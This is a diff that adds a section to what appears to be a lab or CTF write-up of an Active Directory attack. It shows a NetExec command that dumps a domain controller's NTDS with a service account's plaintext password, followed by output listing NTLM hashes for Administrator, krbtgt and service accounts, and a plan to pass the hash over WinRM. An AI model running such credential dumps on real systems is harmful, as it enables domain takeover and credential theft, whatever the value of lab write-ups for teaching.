@@ -632,5 +632,21 @@ This user is not only compromised but they are also and Administrator
 I tried to dump the SAM but the administrator hash did not authenticate me via winrm this makes me think that the local admin on dc02 is disabled so instead i can dump the NTDS
 
 ```python
+nxc smb dc02.corp.darkhaven.tech -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!' --ntds                
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\ldap_svc:D@rkhav3nLDAP2024! (Pwn3d!)
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  Administrator:500:aad3b435b51404eeaad3b435b51404ee:7b941d50b17fd85403bd16467c4c9743:::
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ac1f5ff2bd2333709b990dadc2530bbf:::
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  corp.darkhaven.tech\ldap_svc:1109:aad3b435b51404eeaad3b435b51404ee:8922a7a192311abe3fecea53bb8154a7:::
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  corp.darkhaven.tech\sql_svc:1110:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+....[SNIP].....
+```
+Now i can use this hash to authenticate via winrm on dc02
+
+# Administrator on `DC02`
+```python
 
 ```
